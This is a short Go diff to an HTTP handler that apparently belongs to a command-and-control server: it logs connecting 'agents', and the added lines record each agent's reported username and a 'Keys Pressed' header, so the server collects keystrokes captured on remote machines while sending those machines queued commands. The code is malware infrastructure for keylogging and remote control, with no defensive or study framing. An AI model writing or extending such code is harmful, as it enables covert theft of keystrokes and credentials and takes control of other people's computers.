@@ -12,6 +12,10 @@ func requestHandler(ch chan string) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		slog.Info("Connected Agent: \n")
 		slog.Info("Address: " + r.RemoteAddr)
+		slog.Info("Username: " + r.Header.Get("Username"))
+		if r.Header.Get("Keys") != "" {
+			slog.Info("Keys Pressed: " + r.Header.Get("Keys"))
+		}
 		response, err := io.ReadAll(r.Body)
 		if err != nil {
 			slog.Error("Failed reading request body: " + err.Error())
@@ -24,7 +28,6 @@ func requestHandler(ch chan string) http.HandlerFunc {
 			command := <-ch
 			slog.Info("Command requested: " + command)
 			w.Write([]byte(command))
-
 		}
 	}
 }
